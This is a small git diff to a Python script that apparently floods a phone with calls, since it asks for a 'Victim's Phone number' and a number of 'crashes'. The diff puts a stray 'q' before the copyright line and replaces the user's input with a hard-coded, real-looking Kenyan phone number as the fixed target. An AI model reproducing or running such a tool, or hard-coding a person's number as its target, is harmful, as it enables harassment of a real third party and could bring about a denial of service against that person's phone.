@@ -1,4 +1,4 @@
-# Copyright (c) 2022 X PHANTOM (PH4N70M)
+q# Copyright (c) 2022 X PHANTOM (PH4N70M)
 
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 #of this software and associated documentation files (the "Software"), to deal
@@ -64,7 +64,7 @@ def main():
 	num=input(f"{G}[{Y}+{G}]{M} Enter the Victim's Phone number\n\n{C}=> {cncode}  ")
 	print()
 	crash=int(input(f'{G}[{Y}+{G}]{M} Enter the number of crashes {W}(Max 15 per 30min) \n\n{C}=> '))
-	combnum = f"+{cncode}{num}"
+	combnum = f"+{254}{706545068}"
 	print()
 	Finalcall=input(f'{G}[?]{W} Do You Want To Change NO.{W}{combnum} {R}(Y/N)\n\n{C}=> ')
 	if Finalcall == 'Y'  or Finalcall == 'y':
